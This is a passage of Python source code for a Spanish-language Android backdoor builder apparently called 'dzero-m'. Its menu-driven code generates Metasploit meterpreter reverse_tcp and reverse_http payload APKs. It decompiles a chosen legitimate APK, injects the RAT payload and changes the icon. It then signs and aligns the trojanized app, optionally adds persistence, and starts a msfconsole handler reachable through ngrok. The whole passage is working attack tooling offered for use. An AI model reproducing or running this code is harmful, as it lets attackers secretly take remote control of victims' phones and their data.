									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/payload output/payload.apk output/dzero-m.apk')							
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()

					# Salida de bucle
					OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))											
					mainout = os.path.splitext(OUT)[0]
					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
					time.sleep(4)
					os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_tcp LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
					location = os.getcwd()
					if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
						while var.upper() != "N":
							print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
							time.sleep(4)				 								
							ext = mainout + '.apk'
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
							print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
							break						
						print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
						if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							if not ".tcp.ngrok.io" in LHOST:
								os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"')
								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
					else:
						print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('systemctl stop postgresql && clear')
						main()	
				
				elif a == '02':
					print ('{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN))
					print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
					print ('{0}[02]{1} Use the new dzero-m method'.format(WHITE, YELLOW))

					m = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
					m = m.zfill(2)
					
					if m == '01':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "dzero-m - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -x {0} -p android/meterpreter_reverse_tcp LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
						location = os.getcwd()
						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	

					elif m == '02':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "dzero-m - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_tcp LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
						location = os.getcwd()
						print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
						print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)				
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; rat'])
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/original -o output/dzero-m.apk')
						if os.path.isfile('output/dzero-m.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/dzero-m.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/dzero-m.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/dzero-m.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/dzero-m.apk')							
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()			

					else:
						print("{}\n[X] OPCION INVALIDA\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('clear')
						main()	

				else:
					print("\n{}[X] OPCION INVALIDA\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('clear')
					main()	

			elif pay == '04':
				print ('{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN))
				print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
				print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
				
				a = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
				a = a.zfill(2)
				
				if a == '01':
					run_network()
					LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
						break
					else:
						Tk().withdraw()
						icon = filedialog.askopenfilename(title = "dzero-m - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
						print("\n{0}ICON: {1}".format(YELLOW, icon))						
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))												
						mainout = os.path.splitext(OUT)[0]	
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
						file = open("/tmp/data.txt", "w")
						file.write(icon + '\n')
						file.write(mainout)
						file.close()
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
						print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
						time.sleep(4)						
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/payload -o output/dzero-m.apk')
						location = os.getcwd()
						if os.path.isfile('output/dzero-m.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/dzero-m.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/dzero-m.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/payload output/payload.apk output/dzero-m.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/payload output/payload.apk output/dzero-m.apk')							
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()

					# Salida de bucle
					OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))											
					mainout = os.path.splitext(OUT)[0]
					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
					time.sleep(4)
					os.system('systemctl start postgresql && msfvenom -p android/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
					location = os.getcwd()
					if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
						while var.upper() != "N":
							print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
							time.sleep(4)				 								
							ext = mainout + '.apk'
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
							print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
							break						
						print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
						if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							if not ".tcp.ngrok.io" in LHOST:
								os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"')
								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
					else:
						print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('systemctl stop postgresql && clear')
						main()	
				
				elif a == '02':
					print ('{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN))
					print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
					print ('{0}[02]{1} Use the new dzero-m method'.format(WHITE, YELLOW))

					m = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
					m = m.zfill(2)
					
					if m == '01':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "dzero-m - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -x {0} -p android/meterpreter/reverse_tcp LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
						location = os.getcwd()
						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	

					elif m == '02':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "dzero-m - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/meterpreter/reverse_tcp LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
						location = os.getcwd()
						print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
						print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)				
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; rat'])
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/original -o output/dzero-m.apk')
						if os.path.isfile('output/dzero-m.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/dzero-m.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/dzero-m.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/dzero-m.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/dzero-m.apk')							
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()			

					else:
						print("{}\n[X] OPCION INVALIDA\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('clear')
						main()	

				else:
					print("\n{}[X] OPCION INVALIDA\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('clear')
					main()

			elif pay == '05':
				print ('{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN))
				print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
				print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
				
				a = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
				a = a.zfill(2)
				
				if a == '01':
					run_network()
					LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
						break
					else:
						Tk().withdraw()
						icon = filedialog.askopenfilename(title = "dzero-m - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
						print("\n{0}ICON: {1}".format(YELLOW, icon))						
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))												
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))	
						file = open("/tmp/data.txt", "w")
						file.write(icon + '\n')
						file.write(mainout)
						file.close()
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_http LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
						print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
						time.sleep(4)						
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/payload -o output/dzero-m.apk')
						location = os.getcwd()
						if os.path.isfile('output/dzero-m.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/dzero-m.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/dzero-m.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/payload output/payload.apk output/dzero-m.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_http; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/payload output/payload.apk output/dzero-m.apk')							
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()

					# Salida de bucle
					OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
					mainout = os.path.splitext(OUT)[0]
					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
					time.sleep(4)
					os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_http LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
					location = os.getcwd()
					if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
						while var.upper() != "N":
							print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
							time.sleep(4)				 								
							ext = mainout + '.apk'
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
							print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
							break						
						print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
						if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
